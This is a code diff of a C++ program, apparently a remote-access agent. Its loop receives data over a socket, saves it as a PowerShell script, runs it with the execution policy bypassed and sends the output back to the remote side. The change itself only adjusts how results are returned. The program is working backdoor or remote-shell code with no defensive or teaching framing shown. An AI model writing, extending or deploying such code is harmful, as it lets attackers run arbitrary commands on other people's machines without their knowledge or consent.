@@ -94,7 +94,7 @@ void main()
 				{
 					ZeroMemory(buf, 4096);
 					int bytesReceived = recv(sock, buf, 4096, 0);
-					ofstream file;
+					ofstream file;	
 					file.open("test.ps1");
 
 					string newArg = "-auto";
@@ -105,12 +105,19 @@ void main()
 					file.close();
 
 					result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");
-					cout << result;
 
-					remove("test.ps1");
-					int sendResult = send(sock, result.c_str(), result.size(), 0);
-					result = "";
-					
+					if (result.size() > 0) {
+						remove("test.ps1");
+						int sendResult = send(sock, result.c_str(), result.size(), 0);
+						result = "";
+					}
+					else
+					{
+						result = "It happend";
+						int sendResult = send(sock, result.c_str(), result.size(), 0);
+					}
+
+
 
 
 				}
